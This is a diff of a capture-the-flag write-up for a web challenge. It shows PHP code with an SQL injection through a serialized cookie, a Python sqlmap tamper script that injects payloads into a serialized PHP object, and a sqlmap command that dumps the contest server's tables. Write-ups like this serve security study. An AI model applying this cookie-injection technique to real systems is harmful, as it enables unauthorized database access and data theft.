@@ -2,7 +2,7 @@
 
 **Category:** Web
 **Solves:** 19
-**Description:** 
+**Description:**
 
 (TODO)
 
@@ -15,7 +15,7 @@ When we follow a hacker we note that a cookie containing a serialized PHP object
 ```php
 ...
   if ($rel==='follow'){
-    $r=mysql_query("SELECT * from hackers where handle='$hacker'");       
+    $r=mysql_query("SELECT * from hackers where handle='$hacker'");
     $row=mysql_fetch_assoc($r);
     $value=new hackers($row);
     setcookie("H4ck3rs",base64_encode(serialize($value)));
@@ -67,16 +67,16 @@ def tamper(payload, **kwargs):
     """
     Replace original payload with a serialized PHPObject
     """
-    
+
     # original payload is a serialized and base64 encoded PHPObject
     original_payload = "Tzo3OiJoYWNrZXJzIjoxMDp7czoxNToiAGhhY2tlcnMAaGFuZGxlIjtzOjk6Ilplcm8gQ29vbCI7czoxMjoiAGhhY2tlcnMAYWdlIjtzOjI6IjE4IjtzOjE0OiIAaGFja2VycwBxdW90ZSI7czozNzoiTWVzcyB3aXRoIHRoZSBiZXN0LCBEaWUgbGlrZSB0aGUgcmVzdCI7czoxNDoiAGhhY2tlcnMAcGhvdG8iO3M6MTU6ImltYWdlcy96ZXJvLnBuZyI7czoxMzoiAGhhY2tlcnMAbGlrZSI7czozOiIzMzIiO3M6MTQ6IgBoYWNrZXJzAGRsaWtlIjtzOjE6IjkiO3M6MTI6IgBoYWNrZXJzAHdlYiI7czoyOiI0MCI7czoxMjoiAGhhY2tlcnMAcmV2IjtzOjI6IjkwIjtzOjE0OiIAaGFja2VycwBndWVzcyI7czoyOiIzMCI7czoxMzoiAGhhY2tlcnMAYmVlciI7czoyOiIyMCI7fQ=="
-    
+
     # decode and unserialize the PHPObject
     my_object = unserialize(base64.b64decode(original_payload), object_hook=phpobject)
-    
+
     # append the payload to our handle
     my_object.__php_vars__['\x00hackers\x00handle'] += payload
-    
+
     # return the serialized and encoded PHPObject
     return base64.b64encode(serialize(my_object))
 ```
@@ -85,7 +85,7 @@ Running sqlmap with our tamper script and dumping the secret table reveals the f
 ```
 ./sqlmap.py -u "http://serialhackers.insomni.hack/index.php" --cookie="H4ck3rs=; Following=Stan" -p "H4ck3rs" --tamper="tamper_phpobject" --level=3 --risk=1 --threads=1 --time-sec=5 --tables --exclude-sysdbs -o
 ...
-Database: hackers_db                                                                                                                  
+Database: hackers_db
 [2 tables]
 +---------+
 | hackers |
@@ -104,4 +104,4 @@ Table: secret
 
 ## Other write-ups and resources
 
-* serial_hackers_79022c2579b5ff134338fb696a8196da.zip
+* [serial_hackers_79022c2579b5ff134338fb696a8196da.zip](serial_hackers_79022c2579b5ff134338fb696a8196da.zip)
